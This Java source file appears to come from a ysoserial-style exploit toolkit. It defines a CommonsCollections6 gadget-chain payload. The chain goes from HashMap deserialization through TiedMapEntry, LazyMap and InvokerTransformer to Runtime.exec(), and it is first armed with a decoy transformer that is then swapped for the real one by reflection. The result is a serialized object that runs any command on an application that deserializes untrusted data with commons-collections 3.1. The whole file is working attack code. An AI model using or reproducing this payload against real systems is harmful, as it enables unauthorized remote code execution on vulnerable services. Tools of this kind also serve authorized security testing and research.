package payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;
import util.Reflections;

import java.io.Serializable;
import java.lang.annotation.Retention;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.CCKUAILONG })
public class CommonsCollections6_1 extends PayloadRunner implements ObjectPayload<Map> {

    public Map getObject(final String command) throws Exception {
        final String[] execArgs = new String[]{command};
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class ,new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Map map = new HashMap();
        TiedMapEntry e = new TiedMapEntry(outerMap, "aaa");
        map.put(e, "bbb");
        outerMap.remove("aaa");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return map;

    }

    public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(CommonsCollections6_1.class, command, fusion);
    }
}
